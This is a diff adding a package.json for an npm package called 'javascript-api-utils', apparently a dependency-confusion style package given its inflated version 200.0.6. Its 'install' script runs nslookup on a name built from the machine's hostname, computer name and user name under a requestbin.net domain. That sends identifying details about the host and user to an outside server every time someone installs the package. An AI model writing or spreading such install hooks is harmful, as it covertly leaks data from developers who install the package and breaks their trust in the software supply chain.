@@ -1,0 +1,11 @@
+{
+  "name": "javascript-api-utils",
+  "version": "200.0.6",
+  "description": "javascript-api-utils: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.javascript-api-utils.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
